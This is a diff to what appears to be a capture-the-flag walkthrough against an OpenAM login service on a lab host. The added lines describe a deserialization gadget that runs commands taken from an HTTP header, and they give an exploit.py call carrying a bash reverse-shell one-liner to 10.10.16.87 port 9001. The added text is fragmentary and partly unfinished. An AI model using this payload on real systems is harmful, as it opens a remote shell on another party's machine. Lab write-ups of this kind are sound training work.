@@ -127,7 +127,16 @@ done
 [HTTP 200] /ui/PWResetQuestion
 [HTTP 200] /ui/Login
 
+The embedded shaded Click/Xalan gadget reads a shell command from the `cmd` HTTP header and returns its output in the HTTP response, lets exploit 
+```bash
+python3
 
+exploit.py
+
+--url https://sso.management.htb/openam/ui/PWResetUserValidation
+
+'bash -c "bash -i >& /dev/tcp/10.10.16.87/9001 0>&1"'
+```
 ### Exploitation
 
 Step-by-step exploitation.
